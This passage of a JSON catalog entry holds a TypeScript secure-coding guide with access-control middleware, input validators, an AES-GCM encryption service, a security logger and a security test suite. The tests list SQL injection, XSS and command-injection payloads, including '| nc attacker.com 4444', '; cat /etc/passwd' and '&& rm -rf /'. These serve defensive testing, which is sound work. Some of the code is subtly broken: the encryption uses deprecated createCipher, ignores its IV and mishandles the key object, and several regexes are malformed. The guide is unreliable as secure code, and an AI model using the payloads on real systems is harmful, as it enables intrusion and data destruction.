'profile:write',\n      'data:read'\n    ]));\n  }\n\n  // Check if user has required permission\n  hasPermission(userRoles: string[], requiredPermission: string): boolean {\n    for (const role of userRoles) {\n      const rolePermissions = this.permissions.get(role);\n      if (rolePermissions && rolePermissions.has(requiredPermission)) {\n        return true;\n      }\n    }\n    return false;\n  }\n\n  // Check if user has required role or higher\n  hasRole(userRoles: string[], requiredRole: string): boolean {\n    const allowedRoles = this.roleHierarchy.get(requiredRole);\n    if (!allowedRoles) return false;\n\n    return userRoles.some(role => allowedRoles.includes(role));\n  }\n\n  // Middleware for permission-based access control\n  requirePermission(permission: string) {\n    return (req: any, res: any, next: any) => {\n      const user = req.user;\n      if (!user) {\n        return res.status(401).json({ error: 'Authentication required' });\n      }\n\n      if (!this.hasPermission(user.roles || [], permission)) {\n        this.logSecurityEvent('ACCESS_DENIED', {\n          userId: user.id,\n          requiredPermission: permission,\n          userRoles: user.roles,\n          resource: req.path,\n          method: req.method,\n          timestamp: new Date().toISOString()\n        });\n\n        return res.status(403).json({ error: 'Insufficient permissions' });\n      }\n\n      next();\n    };\n  }\n\n  // Middleware for role-based access control\n  requireRole(role: string) {\n    return (req: any, res: any, next: any) => {\n      const user = req.user;\n      if (!user) {\n        return res.status(401).json({ error: 'Authentication required' });\n      }\n\n      if (!this.hasRole(user.roles || [], role)) {\n        this.logSecurityEvent('ACCESS_DENIED', {\n          userId: user.id,\n          requiredRole: role,\n          userRoles: user.roles,\n          resource: req.path,\n          method: req.method,\n          timestamp: new Date().toISOString()\n        });\n\n        return res.status(403).json({ error: 'Insufficient role' });\n      }\n\n      next();\n    };\n  }\n\n  // Attribute-based access control (ABAC)\n  checkAccess(user: any, resource: any, action: string, context: any = {}): boolean {\n    // Implement complex business logic for access control\n    const policy = this.getAccessPolicy(resource.type, action);\n    return this.evaluatePolicy(policy, user, resource, context);\n  }\n\n  private getAccessPolicy(resourceType: string, action: string): any {\n    // Define access policies\n    const policies = {\n      'document': {\n        'read': (user: any, resource: any, context: any) => {\n          // Owner can always read\n          if (resource.ownerId === user.id) return true;\n          \n          // Public documents can be read by anyone\n          if (resource.visibility === 'public') return true;\n          \n          // Shared documents can be read by specified users\n          if (resource.sharedWith && resource.sharedWith.includes(user.id)) return true;\n          \n          return false;\n        },\n        'write': (user: any, resource: any, context: any) => {\n          // Only owner can write\n          if (resource.ownerId === user.id) return true;\n          \n          // Users with write permission can write\n          if (resource.permissions && resource.permissions[user.id] === 'write') return true;\n          \n          return false;\n        }\n      }\n    };\n\n    return policies[resourceType]?.[action];\n  }\n\n  private evaluatePolicy(policy: Function, user: any, resource: any, context: any): boolean {\n    if (!policy) return false;\n    \n    try {\n      return policy(user, resource, context);\n    } catch (error) {\n      this.logSecurityEvent('POLICY_EVALUATION_ERROR', {\n        error: error.message,\n        userId: user.id,\n        resourceId: resource.id,\n        timestamp: new Date().toISOString()\n      });\n      return false;\n    }\n  }\n\n  private logSecurityEvent(event: string, data: any): void {\n    console.log('AUTHORIZATION_EVENT:', JSON.stringify({ event, data }));\n  }\n}\n```\n\n## Input Validation and Sanitization\n\n### Comprehensive Input Validation\n```typescript\n// src/validation/input-validator.ts\nimport validator from 'validator';\nimport DOMPurify from 'isomorphic-dompurify';\n\nexport class InputValidator {\n  private static readonly MAX_STRING_LENGTH = 10000;\n  private static readonly MAX_ARRAY_LENGTH = 1000;\n  private static readonly MAX_OBJECT_DEPTH = 10;\n\n  // SQL Injection Prevention\n  static validateSQLInput(input: string): { valid: boolean; sanitized: string; errors: string[] } {\n    const errors: string[] = [];\n    let sanitized = input;\n\n    // Check for SQL injection patterns\n    const sqlInjectionPatterns = [\n      /('|(\\')|(;)|(--)|(s*(union|select|insert|update|delete|drop|create|alter|exec|execute)s+)/gi,\n      /(script|javascript|vbscript|onload|onerror|onclick)/gi\n    ];\n\n    for (const pattern of sqlInjectionPatterns) {\n      if (pattern.test(input)) {\n        errors.push('Input contains potentially dangerous SQL patterns');\n        break;\n      }\n    }\n\n    // Escape single quotes for SQL\n    sanitized = sanitized.replace(/'/g, \"''\");\n\n    return {\n      valid: errors.length === 0,\n      sanitized,\n      errors\n    };\n  }\n\n  // XSS Prevention\n  static validateAndSanitizeHTML(input: string): { valid: boolean; sanitized: string; errors: string[] } {\n    const errors: string[] = [];\n\n    // Check for script tags and javascript protocols\n    const xssPatterns = [\n      /<script[^>]*>.*?</script>/gi,\n      /javascript:/gi,\n      /onw+s*=/gi,\n      /<iframe[^>]*>.*?</iframe>/gi\n    ];\n\n    for (const pattern of xssPatterns) {\n      if (pattern.test(input)) {\n        errors.push('Input contains potentially dangerous XSS patterns');\n        break;\n      }\n    }\n\n    // Sanitize HTML\n    const sanitized = DOMPurify.sanitize(input, {\n      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li'],\n      ALLOWED_ATTR: []\n    });\n\n    return {\n      valid: errors.length === 0,\n      sanitized,\n      errors\n    };\n  }\n\n  // NoSQL Injection Prevention\n  static validateNoSQLInput(input: any): { valid: boolean; sanitized: any; errors: string[] } {\n    const errors: string[] = [];\n    let sanitized = input;\n\n    if (typeof input === 'object' && input !== null) {\n      // Check for MongoDB injection patterns\n      const dangerousKeys = ['$where', '$ne', '$in', '$nin', '$or', '$and', '$nor', '$regex'];\n      \n      const checkObject = (obj: any, depth = 0): boolean => {\n        if (depth > this.MAX_OBJECT_DEPTH) {\n          errors.push('Object nesting too deep');\n          return false;\n        }\n\n        for (const key in obj) {\n          if (dangerousKeys.includes(key)) {\n            errors.push(`Dangerous NoSQL operator detected: ${key}`);\n            return false;\n          }\n\n          if (typeof obj[key] === 'object' && obj[key] !== null) {\n            if (!checkObject(obj[key], depth + 1)) {\n              return false;\n            }\n          }\n        }\n        return true;\n      };\n\n      if (!checkObject(input)) {\n        sanitized = {};\n      }\n    }\n\n    return {\n      valid: errors.length === 0,\n      sanitized,\n      errors\n    };\n  }\n\n  // Comprehensive input validation\n  static validateUserInput(input: any, schema: ValidationSchema): ValidationResult {\n    const errors: string[] = [];\n    const sanitized: any = {};\n\n    for (const [field, rules] of Object.entries(schema.fields)) {\n      const value = input[field];\n      const fieldResult = this.validateField(value, rules, field);\n      \n      if (!fieldResult.valid) {\n        errors.push(...fieldResult.errors);\n      } else {\n        sanitized[field] = fieldResult.sanitized;\n      }\n    }\n\n    return {\n      valid: errors.length === 0,\n      sanitized,\n      errors\n    };\n  }\n\n  private static validateField(value: any, rules: FieldRules, fieldName: string): ValidationResult {\n    const errors: string[] = [];\n    let sanitized = value;\n\n    // Required check\n    if (rules.required && (value === undefined || value === null || value === '')) {\n      errors.push(`${fieldName} is required`);\n      return { valid: false, sanitized: null, errors };\n    }\n\n    // Skip further validation if not required and empty\n    if (!rules.required && (value === undefined || value === null || value === '')) {\n      return { valid: true, sanitized: null, errors: [] };\n    }\n\n    // Type validation\n    if (rules.type && typeof value !== rules.type) {\n      errors.push(`${fieldName} must be of type ${rules.type}`);\n      return { valid: false, sanitized: value, errors };\n    }\n\n    // String validations\n    if (typeof value === 'string') {\n      if (rules.minLength && value.length < rules.minLength) {\n        errors.push(`${fieldName} must be at least ${rules.minLength} characters long`);\n      }\n\n      if (rules.maxLength && value.length > rules.maxLength) {\n        errors.push(`${fieldName} must be no more than ${rules.maxLength} characters long`);\n      }\n\n      if (rules.pattern && !rules.pattern.test(value)) {\n        errors.push(`${fieldName} format is invalid`);\n      }\n\n      // Sanitize string\n      sanitized = value.trim();\n      \n      if (rules.sanitizeHTML) {\n        const htmlResult = this.validateAndSanitizeHTML(sanitized);\n        sanitized = htmlResult.sanitized;\n        if (!htmlResult.valid) {\n          errors.push(...htmlResult.errors);\n        }\n      }\n    }\n\n    // Number validations\n    if (typeof value === 'number') {\n      if (rules.min !== undefined && value < rules.min) {\n        errors.push(`${fieldName} must be at least ${rules.min}`);\n      }\n\n      if (rules.max !== undefined && value > rules.max) {\n        errors.push(`${fieldName} must be no more than ${rules.max}`);\n      }\n    }\n\n    // Array validations\n    if (Array.isArray(value)) {\n      if (rules.maxItems && value.length > rules.maxItems) {\n        errors.push(`${fieldName} must have no more than ${rules.maxItems} items`);\n      }\n\n      if (rules.minItems && value.length < rules.minItems) {\n        errors.push(`${fieldName} must have at least ${rules.minItems} items`);\n      }\n    }\n\n    // Email validation\n    if (rules.email && !validator.isEmail(value)) {\n      errors.push(`${fieldName} must be a valid email address`);\n    }\n\n    // URL validation\n    if (rules.url && !validator.isURL(value)) {\n      errors.push(`${fieldName} must be a valid URL`);\n    }\n\n    return {\n      valid: errors.length === 0,\n      sanitized,\n      errors\n    };\n  }\n}\n\n// Validation middleware\nexport function validateInput(schema: ValidationSchema) {\n  return (req: any, res: any, next: any) => {\n    const result = InputValidator.validateUserInput(req.body, schema);\n    \n    if (!result.valid) {\n      return res.status(400).json({\n        error: 'Validation failed',\n        details: result.errors\n      });\n    }\n\n    req.validatedBody = result.sanitized;\n    next();\n  };\n}\n\ninterface ValidationSchema {\n  fields: { [key: string]: FieldRules };\n}\n\ninterface FieldRules {\n  type?: 'string' | 'number' | 'boolean' | 'object';\n  required?: boolean;\n  minLength?: number;\n  maxLength?: number;\n  min?: number;\n  max?: number;\n  pattern?: RegExp;\n  email?: boolean;\n  url?: boolean;\n  sanitizeHTML?: boolean;\n  maxItems?: number;\n  minItems?: number;\n}\n\ninterface ValidationResult {\n  valid: boolean;\n  sanitized: any;\n  errors: string[];\n}\n```\n\n## Cryptographic Security\n\n### Secure Encryption Service\n```typescript\n// src/crypto/encryption-service.ts\nimport crypto from 'crypto';\nimport { promisify } from 'util';\n\nexport class EncryptionService {\n  private readonly ALGORITHM = 'aes-256-gcm';\n  private readonly KEY_LENGTH = 32; // 256 bits\n  private readonly IV_LENGTH = 16;  // 128 bits\n  private readonly SALT_LENGTH = 32; // 256 bits\n  private readonly TAG_LENGTH = 16; // 128 bits\n  private readonly ITERATIONS = 100000; // PBKDF2 iterations\n\n  // Encrypt data with AES-256-GCM\n  encrypt(plaintext: string, password?: string): EncryptionResult {\n    try {\n      const key = password ? this.deriveKey(password) : this.generateKey();\n      const iv = crypto.randomBytes(this.IV_LENGTH);\n      \n      const cipher = crypto.createCipher(this.ALGORITHM, key);\n      cipher.setAAD(Buffer.from('authenticated-data'));\n      \n      let encrypted = cipher.update(plaintext, 'utf8', 'hex');\n      encrypted += cipher.final('hex');\n      \n      const tag = cipher.getAuthTag();\n      \n      const result = {\n        encrypted,\n        iv: iv.toString('hex'),\n        tag: tag.toString('hex'),\n        salt: key.salt?.toString('hex'),\n        algorithm: this.ALGORITHM\n      };\n\n      return result;\n    } catch (error) {\n      throw new Error(`Encryption failed: ${error.message}`);\n    }\n  }\n\n  // Decrypt data with AES-256-GCM\n  decrypt(encryptionResult: EncryptionResult, password?: string): string {\n    try {\n      const key = password && encryptionResult.salt \n        ? this.deriveKeyFromSalt(password, Buffer.from(encryptionResult.salt, 'hex'))\n        : this.getStoredKey(); // Implement key retrieval\n\n      const decipher = crypto.createDecipher(encryptionResult.algorithm, key.key);\n      decipher.setAAD(Buffer.from('authenticated-data'));\n      decipher.setAuthTag(Buffer.from(encryptionResult.tag, 'hex'));\n      \n      let decrypted = decipher.update(encryptionResult.encrypted, 'hex', 'utf8');\n      decrypted += decipher.final('utf8');\n      \n      return decrypted;\n    } catch (error) {\n      throw new Error(`Decryption failed: ${error.message}`);\n    }\n  }\n\n  // Hash passwords securely\n  async hashPassword(password: string): Promise<PasswordHash> {\n    const salt = crypto.randomBytes(this.SALT_LENGTH);\n    const hash = await promisify(crypto.pbkdf2)(password, salt, this.ITERATIONS, 64, 'sha512');\n    \n    return {\n      hash: hash.toString('hex'),\n      salt: salt.toString('hex'),\n      iterations: this.ITERATIONS,\n      algorithm: 'pbkdf2-sha512'\n    };\n  }\n\n  // Verify password against hash\n  async verifyPassword(password: string, passwordHash: PasswordHash): Promise<boolean> {\n    try {\n      const salt = Buffer.from(passwordHash.salt, 'hex');\n      const hash = await promisify(crypto.pbkdf2)(\n        password, \n        salt, \n        passwordHash.iterations, \n        64, \n        'sha512'\n      );\n      \n      return crypto.timingSafeEqual(\n        Buffer.from(passwordHash.hash, 'hex'),\n        hash\n      );\n    } catch (error) {\n      return false;\n    }\n  }\n\n  // Generate cryptographically secure random tokens\n  generateSecureToken(length: number = 32): string {\n    return crypto.randomBytes(length).toString('hex');\n  }\n\n  // Generate HMAC for data integrity\n  generateHMAC(data: string, secret: string): string {\n    return crypto.createHmac('sha256', secret).update(data).digest('hex');\n  }\n\n  // Verify HMAC\n  verifyHMAC(data: string, secret: string, expectedHmac: string): boolean {\n    const computedHmac = this.generateHMAC(data, secret);\n    return crypto.timingSafeEqual(\n      Buffer.from(expectedHmac, 'hex'),\n      Buffer.from(computedHmac, 'hex')\n    );\n  }\n\n  // Key derivation from password\n  private deriveKey(password: string): { key: Buffer; salt: Buffer } {\n    const salt = crypto.randomBytes(this.SALT_LENGTH);\n    const key = crypto.pbkdf2Sync(password, salt, this.ITERATIONS, this.KEY_LENGTH, 'sha256');\n    return { key, salt };\n  }\n\n  private deriveKeyFromSalt(password: string, salt: Buffer): { key: Buffer; salt: Buffer } {\n    const key = crypto.pbkdf2Sync(password, salt, this.ITERATIONS, this.KEY_LENGTH, 'sha256');\n    return { key, salt };\n  }\n\n  // Generate random encryption key\n  private generateKey(): { key: Buffer; salt?: Buffer } {\n    return { key: crypto.randomBytes(this.KEY_LENGTH) };\n  }\n\n  private getStoredKey(): { key: Buffer } {\n    // Implement secure key storage/retrieval\n    const keyFromEnv = process.env.ENCRYPTION_KEY;\n    if (!keyFromEnv) {\n      throw new Error('Encryption key not found');\n    }\n    return { key: Buffer.from(keyFromEnv, 'hex') };\n  }\n}\n\ninterface EncryptionResult {\n  encrypted: string;\n  iv: string;\n  tag: string;\n  salt?: string;\n  algorithm: string;\n}\n\ninterface PasswordHash {\n  hash: string;\n  salt: string;\n  iterations: number;\n  algorithm: string;\n}\n```\n\n## Security Monitoring and Logging\n\n### Security Event Logger\n```typescript\n// src/logging/security-logger.ts\nimport winston from 'winston';\nimport { ElasticsearchTransport } from 'winston-elasticsearch';\n\nexport class SecurityLogger {\n  private logger: winston.Logger;\n  private alertThresholds: Map<string, AlertConfig> = new Map();\n\n  constructor() {\n    this.initializeLogger();\n    this.setupAlertThresholds();\n  }\n\n  private initializeLogger(): void {\n    const transports: winston.transport[] = [\n      new winston.transports.Console({\n        format: winston.format.combine(\n          winston.format.timestamp(),\n          winston.format.colorize(),\n          winston.format.printf(({ level, message, timestamp, ...meta }) => {\n            return `${timestamp} [${level}]: ${message} ${Object.keys(meta).length ? JSON.stringify(meta, null, 2) : ''}`;\n          })\n        )\n      }),\n      new winston.transports.File({\n        filename: 'logs/security.log',\n        format: winston.format.combine(\n          winston.format.timestamp(),\n          winston.format.json()\n        )\n      })\n    ];\n\n    // Add Elasticsearch transport for production\n    if (process.env.NODE_ENV === 'production' && process.env.ELASTICSEARCH_URL) {\n      transports.push(new ElasticsearchTransport({\n        level: 'info',\n        clientOpts: { node: process.env.ELASTICSEARCH_URL },\n        index: 'security-logs'\n      }));\n    }\n\n    this.logger = winston.createLogger({\n      level: 'info',\n      format: winston.format.combine(\n        winston.format.timestamp(),\n        winston.format.errors({ stack: true }),\n        winston.format.json()\n      ),\n      transports\n    });\n  }\n\n  private setupAlertThresholds(): void {\n    this.alertThresholds.set('FAILED_LOGIN', {\n      count: 5,\n      timeWindow: 5 * 60 * 1000, // 5 minutes\n      severity: 'MEDIUM'\n    });\n\n    this.alertThresholds.set('SQL_INJECTION_ATTEMPT', {\n      count: 1,\n      timeWindow: 60 * 1000, // 1 minute\n      severity: 'HIGH'\n    });\n\n    this.alertThresholds.set('XSS_ATTEMPT', {\n      count: 3,\n      timeWindow: 5 * 60 * 1000,\n      severity: 'HIGH'\n    });\n  }\n\n  logSecurityEvent(event: SecurityEvent): void {\n    const logEntry = {\n      ...event,\n      timestamp: new Date().toISOString(),\n      severity: this.calculateSeverity(event),\n      source: 'security-system'\n    };\n\n    // Log the event\n    switch (logEntry.severity) {\n      case 'CRITICAL':\n        this.logger.error('SECURITY_EVENT', logEntry);\n        break;\n      case 'HIGH':\n        this.logger.warn('SECURITY_EVENT', logEntry);\n        break;\n      default:\n        this.logger.info('SECURITY_EVENT', logEntry);\n    }\n\n    // Check if we need to trigger alerts\n    this.checkAlertThresholds(event);\n\n    // Send to security monitoring system\n    this.sendToSIEM(logEntry);\n  }\n\n  private calculateSeverity(event: SecurityEvent): Severity {\n    const highSeverityEvents = [\n      'SQL_INJECTION_ATTEMPT',\n      'XSS_ATTEMPT',\n      'PRIVILEGE_ESCALATION',\n      'DATA_BREACH',\n      'SYSTEM_COMPROMISE'\n    ];\n\n    const mediumSeverityEvents = [\n      'FAILED_LOGIN',\n      'ACCOUNT_LOCKED',\n      'SUSPICIOUS_ACTIVITY',\n      'UNAUTHORIZED_ACCESS_ATTEMPT'\n    ];\n\n    if (highSeverityEvents.includes(event.type)) return 'HIGH';\n    if (mediumSeverityEvents.includes(event.type)) return 'MEDIUM';\n    return 'LOW';\n  }\n\n  private checkAlertThresholds(event: SecurityEvent): void {\n    const alertConfig = this.alertThresholds.get(event.type);\n    if (!alertConfig) return;\n\n    // Implementation would check event frequency and trigger alerts\n    // This would typically involve storing event counts in Redis or similar\n  }\n\n  private async sendToSIEM(logEntry: any): Promise<void> {\n    if (process.env.SIEM_ENDPOINT) {\n      try {\n        // Send to SIEM system (Splunk, ELK, etc.)\n        await fetch(process.env.SIEM_ENDPOINT, {\n          method: 'POST',\n          headers: {\n            'Content-Type': 'application/json',\n            'Authorization': `Bearer ${process.env.SIEM_API_KEY}`\n          },\n          body: JSON.stringify(logEntry)\n        });\n      } catch (error) {\n        this.logger.error('Failed to send to SIEM', { error: error.message });\n      }\n    }\n  }\n}\n\ninterface SecurityEvent {\n  type: string;\n  userId?: string;\n  ipAddress?: string;\n  userAgent?: string;\n  resource?: string;\n  action?: string;\n  details?: any;\n  riskScore?: number;\n}\n\ninterface AlertConfig {\n  count: number;\n  timeWindow: number;\n  severity: Severity;\n}\n\ntype Severity = 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';\n```\n\n## Security Testing\n\n### Automated Security Testing\n```typescript\n// tests/security/security-test-suite.ts\nimport { SecurityTestRunner } from './security-test-runner';\n\ndescribe('Security Test Suite', () => {\n  const testRunner = new SecurityTestRunner();\n\n  describe('Authentication Security', () => {\n    test('should prevent brute force attacks', async () => {\n      const result = await testRunner.testBruteForceProtection();\n      expect(result.protected).toBe(true);\n      expect(result.lockoutTriggered).toBe(true);\n    });\n\n    test('should enforce strong password policy', async () => {\n      const weakPasswords = ['123456', 'password', 'qwerty'];\n      for (const password of weakPasswords) {\n        const result = await testRunner.testPasswordStrength(password);\n        expect(result.accepted).toBe(false);\n      }\n    });\n\n    test('should validate JWT tokens properly', async () => {\n      const maliciousTokens = [\n        'eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.',\n        'invalid.token.here',\n        '' // empty token\n      ];\n\n      for (const token of maliciousTokens) {\n        const result = await testRunner.testJWTValidation(token);\n        expect(result.valid).toBe(false);\n      }\n    });\n  });\n\n  describe('Input Validation Security', () => {\n    test('should prevent SQL injection', async () => {\n      const sqlInjectionPayloads = [\n        \"'; DROP TABLE users; --\",\n        \"' OR '1'='1\",\n        \"1' UNION SELECT * FROM passwords --\"\n      ];\n\n      for (const payload of sqlInjectionPayloads) {\n        const result = await testRunner.testSQLInjection(payload);\n        expect(result.blocked).toBe(true);\n      }\n    });\n\n    test('should prevent XSS attacks', async () => {\n      const xssPayloads = [\n        '<script>alert(\"xss\")</script>',\n        'javascript:alert(\"xss\")',\n        '<img src=\"x\" onerror=\"alert(1)\">'\n      ];\n\n      for (const payload of xssPayloads) {\n        const result = await testRunner.testXSSPrevention(payload);\n        expect(result.sanitized).not.toContain('<script>');\n        expect(result.sanitized).not.toContain('javascript:');\n      }\n    });\n\n    test('should prevent command injection', async () => {\n      const commandInjectionPayloads = [\n        '; cat /etc/passwd',\n        '&& rm -rf /',\n        '| nc attacker.com 4444'\n      ];\n\n      for (const payload of commandInjectionPayloads) {\n        const result = await testRunner.testCommandInjection(payload);\n        expect(result.blocked).toBe(true);\n      }\n    });\n  });\n\n  describe('Authorization Security', () => {\n    test('should enforce proper access controls', async () => {\n      const testCases = [\n        { userId: 'user1', resource: '/admin', expectedAccess: false },\n        { userId: 'admin1', resource: '/admin', expectedAccess: true },\n        { userId: 'user1', resource: '/user/profile', expectedAccess: true }\n      ];\n\n      for (const testCase of testCases) {\n        const result = await testRunner.testAccessControl(\n          testCase.userId, \n          testCase.resource\n        );\n        expect(result.accessGranted).toBe(testCase.expectedAccess);\n      }\n    });\n\n    test('should prevent privilege escalation', async () => {\n      const result = await testRunner.testPrivilegeEscalation();\n      expect(result.escalationPrevented).toBe(true);\n    });\n  });\n\n  describe('Session Security', () => {\n    test('should implement secure session management', async () => {\n      const result = await testRunner.testSessionSecurity();\n      expect(result.sessionTimeout).toBe(true);\n      expect(result.sessionRotation).toBe(true);\n      expect(result.secureFlags).toBe(true);\n    });\n\n    test('should prevent session fixation', async () => {\n      const result = await testRunner.testSessionFixation();\n      expect(result.sessionRegeneratedOnLogin).toBe(true);\n    });\n  });\n\n  describe('Data Protection', () => {\n    test('should encrypt sensitive data', async () => {\n      const sensitiveData = 'personal-information';\n      const result = await testRunner.testDataEncryption(sensitiveData);\n      expect(result.encrypted).toBe(true);\n      expect(result.decryptedCorrectly).toBe(true);\n    });\n\n    test('should implement proper key management', async () => {\n      const result = await testRunner.testKeyManagement();\n      expect(result.keyRotation).toBe(true);\n      expect(result.keyStorage).toBe(true);\n    });\n  });\n});\n```\n\n## Best Practices and Guidelines\n\n### Secure Development Lifecycle\n1. **Threat Modeling**: Identify and analyze potential threats early in development\n2. **Security Requirements**: Define security requirements alongside functional requirements\n3. **Secure Coding Standards**: Establish and enforce secure coding guidelines\n4. **Security Testing**: Integrate security testing throughout the development process\n5. **Security Reviews**: Conduct regular security code reviews and assessments\n6. **Incident Response**: Prepare and test incident response procedures\n\n### OWASP Security Controls\n- **Authentication**: Multi-factor authentication, secure password policies\n- **Session Management**: Secure session handling, timeout policies\n- **Access Control**: Role-based access control, principle of least privilege\n- **Input Validation**: Comprehensive input validation and sanitization\n- **Output Encoding**: Proper output encoding to prevent XSS\n- **Cryptography**: Strong encryption algorithms and key management\n- **Error Handling**: Secure error handling without information disclosure\n- **Logging**: Comprehensive security logging and monitoring\n\n### Security Monitoring Strategy\n- **Real-time Monitoring**: Monitor security events in real-time\n- **Threat Intelligence**: Integrate threat intelligence feeds\n- **Behavioral Analysis**: Detect anomalous user behavior\n- **Vulnerability Management**: Regular vulnerability scanning and patching\n- **Compliance Monitoring**: Ensure compliance with security standards\n\n### Security Testing Approach\n- **Static Analysis**: Automated code analysis for security vulnerabilities\n- **Dynamic Analysis**: Runtime security testing of running applications\n- **Interactive Testing**: Manual penetration testing and security assessments\n- **Dependency Scanning**: Regular scanning of third-party dependencies\n- **Infrastructure Testing**: Security testing of infrastructure components",
      "tags": [
        {
          "tag": {
            "id": "security",
            "name": "security",
            "slug": "security"
          }
        },
        {
          "tag": {
            "id": "owasp",
            "name": "owasp",
            "slug": "owasp"
          }
        },
        {
          "tag": {
            "id": "secure-coding",
            "name": "secure-coding",
            "slug": "secure-coding"
          }
        },
        {
          "tag": {
            "id": "vulnerability-assessment",
            "name": "vulnerability-assessment",
            "slug": "vulnerability-assessment"
          }
        },
        {
          "tag": {
            "id": "security-testing",
            "name": "security-testing",
            "slug": "security-testing"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 18,
        "copies": 248
      },
      "_count": {
        "votes": 10,
        "copies": 194
      },
      "difficulty": "ADVANCED",
      "language": "Multiple",
      "framework": "Security-First Architecture",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    }
  ],
  "meta": {
    "total": 20,
    "type": "CONFIGURATION",
    "generated_at": "2025-07-31T22:29:29.884Z"
  }
}